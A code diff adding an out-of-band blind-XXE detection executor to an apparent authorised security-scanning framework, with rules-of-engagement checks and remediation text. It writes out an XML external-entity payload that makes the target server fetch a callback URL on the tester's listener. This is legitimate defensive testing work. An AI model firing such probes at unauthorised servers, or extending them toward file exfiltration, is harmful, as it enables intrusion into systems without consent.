@@ -57,6 +57,10 @@ class FetchResult:
 # A Fetcher performs ONE safe GET and returns a FetchResult. Injected so tests
 # can supply crafted responses and production supplies a real httpx client.
 Fetcher = Callable[[str], Awaitable[FetchResult]]
+# A Poster performs ONE body POST (url, body, content_type) -> FetchResult.
+# Injected like Fetcher; only the XXE executor needs it, and only for an inert,
+# detection-only XML payload. None when posting isn't wired.
+Poster = Callable[[str, bytes, str], Awaitable[FetchResult]]
 
 
 class Executor(Protocol):
@@ -74,7 +78,8 @@ class ExecContext:
     max_probes: int = 5
     pace_seconds: float = 0.3
     base_url: str = ""             # e.g. "https://host"
-    oob_base_url: str = ""         # public callback base for OOB detection (SSRF)
+    oob_base_url: str = ""         # public callback base for OOB detection (SSRF/XXE)
+    post: "Optional[Poster]" = None  # body POST, for XXE's inert XML detection payload
 
 
 # Parameter names that commonly carry a URL/host the server fetches — the
@@ -581,6 +586,127 @@ class SsrfOobExecutor:
         return finding
 
 
+class XxeOobExecutor:
+    """Out-of-band blind-XXE confirmation (CWE-611).
+
+    Submits an INERT, DETECTION-ONLY XML document whose external entity points
+    at a unique callback URL on our listener:
+
+        <!DOCTYPE t [ <!ENTITY x SYSTEM "http://<listener>/oob/<token>/xxe"> ]>
+        <t>&x;</t>
+
+    If the server's XML parser resolves external entities, it fetches that URL,
+    and our listener records the interaction — direct proof of blind XXE, with
+    no change in the HTTP response. This is the standard non-destructive XXE
+    detection test. It deliberately does NOT use file:// or parameter-entity
+    exfiltration (the weaponized variant): the entity only triggers an HTTP
+    callback, which is the proof. POST-only (XXE lives in the request body);
+    no data is modified.
+
+    Two independent evidence types are attached (the probe + the OOB
+    interaction). Skips cleanly without an OOB base or a POST capability."""
+
+    handles = {HypothesisKind.XXE}
+
+    _XML_CT = "application/xml"
+
+    async def execute(self, hyp: Hypothesis, ctx: "ExecContext") -> list[Finding]:
+        if not ctx.roe.target_authorized(ctx.target_host):
+            logger.warning("xxe: %s not authorized by RoE - skipping", ctx.target_host)
+            return []
+        if not ctx.oob_base_url:
+            logger.info("xxe: no OOB callback base configured - skipping")
+            return []
+        if ctx.post is None:
+            logger.info("xxe: no POST capability wired - skipping")
+            return []
+
+        from oob.listener import store, callback_url
+        st = store()
+        base = ctx.base_url or f"https://{ctx.target_host}"
+        findings: list[Finding] = []
+        probed = 0
+        for path in hyp.target_endpoints:
+            if probed >= ctx.max_probes:
+                break
+            token = st.new_token()
+            cb = callback_url(token, ctx.oob_base_url) + "/xxe"
+            body = self._payload(cb)
+            url = base.rstrip("/") + "/" + path.lstrip("/")
+            try:
+                probe = await ctx.post(url, body.encode(), self._XML_CT)
+            except Exception as e:  # noqa: BLE001
+                logger.info("xxe: post failed %s: %s", url, e)
+                continue
+            probed += 1
+            interactions = []
+            for _ in range(4):
+                await asyncio.sleep(1.5)
+                interactions = st.poll(token)
+                if interactions:
+                    break
+            if interactions:
+                findings.append(self._finding(path, cb, url, probe, interactions, ctx))
+        return findings
+
+    @staticmethod
+    def _payload(cb: str) -> str:
+        # Detection-only: external entity triggers an HTTP callback. No file://,
+        # no parameter entities, nothing exfiltrated.
+        ent = "h4ckxxe"
+        return (f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE probe [ <!ENTITY {ent} SYSTEM "{cb}"> ]>\n'
+                f'<probe>&{ent};</probe>')
+
+    def _finding(self, path, cb, url, probe, interactions, ctx) -> Finding:
+        asset = Asset(asset_id="a0", name=ctx.target_host, asset_type="web",
+                      scope_approved=True, metadata={"exposure": "internet"})
+        finding = Finding(
+            finding_id=str(uuid.uuid4()),
+            title=f"Blind XML External Entity (XXE) on {path}",
+            description=(
+                f"The XML parser at {path} resolved an external entity pointing to a unique inert "
+                f"callback ({cb}); the server fetched it, recorded out-of-band by our listener "
+                f"({len(interactions)} interaction(s)). This confirms blind XXE — the parser processes "
+                "external entities from untrusted input. Detection-only: the entity triggered an HTTP "
+                "callback; no file was read and nothing was exfiltrated."
+            ),
+            asset=asset,
+            module_source="xxe_oob_executor",
+            finding_kind=FindingKind.VULNERABILITY,
+            cvss=CvssScore(base_score=7.1,
+                           vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L"),
+            cwe=WeaknessRef(cwe_id="CWE-611", name="Improper Restriction of XML External Entity Reference (XXE)"),
+            mitre_techniques=[MitreTechnique(technique_id="T1190", tactic="initial-access",
+                                             name="Exploit Public-Facing Application")],
+            kill_chain_phase=KillChainPhase.EXPLOITATION,
+            remediation=(
+                "Disable external entity and DTD processing in the XML parser (set FEATURE_SECURE_PROCESSING, "
+                "disallow-doctype-decl). Prefer a parser hardened against XXE by default."
+            ),
+            business_impact="XXE can read internal files, perform SSRF to internal services, and exfiltrate data.",
+            requires_corroboration=True,
+        )
+        tx = (f"POST {url}\nContent-Type: {self._XML_CT}\nstatus: {probe.status}\n"
+              f"injected detection-only external entity -> {cb}")
+        finding.add_evidence(Evidence.new(
+            evidence_type=EvidenceType.HTTP_TRANSACTION, raw_bytes=tx.encode(),
+            storage_ref=f"mem://xxe/{finding.finding_id}",
+            description=f"XXE probe (inert external entity) on {path}",
+            metadata={"preview": tx},
+        ))
+        oob_text = ("Out-of-band callback received — proof the XML parser fetched the entity URL:\n\n"
+                    + "\n\n".join(i.summary() for i in interactions[:5]))
+        finding.add_evidence(Evidence.new(
+            evidence_type=EvidenceType.RAW_OUTPUT, raw_bytes=oob_text.encode(),
+            storage_ref=f"mem://xxe-oob/{finding.finding_id}",
+            description="Out-of-band interaction(s) recorded by the listener",
+            metadata={"preview": oob_text, "source": "oob_listener"},
+        ))
+        logger.info("xxe: CONFIRMED on %s (%d OOB interaction(s))", path, len(interactions))
+        return finding
+
+
 class ExecutorRegistry:
     """Maps a hypothesis to the executor that can safely check it. Each executor
     is non-destructive (GET-only, inert probes), scope-gated against the RoE, and
@@ -594,6 +720,7 @@ class ExecutorRegistry:
             XssReflectionExecutor(),
             InjectionProbeExecutor(),
             SsrfOobExecutor(),
+            XxeOobExecutor(),
         ]
 
     def for_hypothesis(self, hyp: Hypothesis) -> Optional[Executor]:
